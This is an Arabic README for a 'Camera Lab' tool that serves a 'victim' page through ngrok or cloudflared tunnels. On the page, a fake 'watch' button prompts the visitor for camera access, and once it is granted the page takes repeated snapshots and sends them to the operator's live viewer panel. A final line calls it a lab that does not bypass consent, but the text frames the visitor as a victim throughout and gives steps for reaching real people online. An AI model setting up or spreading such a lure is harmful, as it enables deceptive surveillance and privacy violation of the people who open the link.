# Camera Lab — مختبر تجريبي

## التشغيل المحلي
    ./run.sh
افتح: http://localhost:5000        ← صفحة الضحية
افتح: http://localhost:5000/viewer ← لوحة اللقطات عندك

## عبر الإنترنت (HTTPS إلزامي للكاميرا)
المتصفحات لا تمنح الكاميرا إلا على:
  - localhost   أو
  - HTTPS

لذلك استخدم نفق:

### ngrok
    ngrok http 5000
يعطيك رابطاً مثل: https://xxxx.ngrok-free.app

- رابط الضحية:  https://xxxx.ngrok-free.app/
- لوحة العرض:   https://xxxx.ngrok-free.app/viewer

### cloudflared (بديل مجاني)
    cloudflared tunnel --url http://localhost:5000

## حماية لوحة العرض (اختياري)
    VIEWER_TOKEN=mysecret python server.py
ثم افتح: /viewer?k=mysecret

## سلوك الصفحة
1. الضحية يفتح الرابط → يرى زر "▶ مشاهدة".
2. يضغط → كروم/سفاري يسأل "السماح بالكاميرا؟".
3. عند الموافقة → لقطة كل 4 ثوانٍ، حتى 15 لقطة.
4. الصور تُحفظ في captures/ وتظهر في /viewer مباشرة.

## ملاحظة تقنية صريحة
بدون موافقة الضحية على نافذة الإذن، لا تُلتقط أي صورة.
هذا مختبر لفهم السلسلة والإذن، لا لتجاوزه.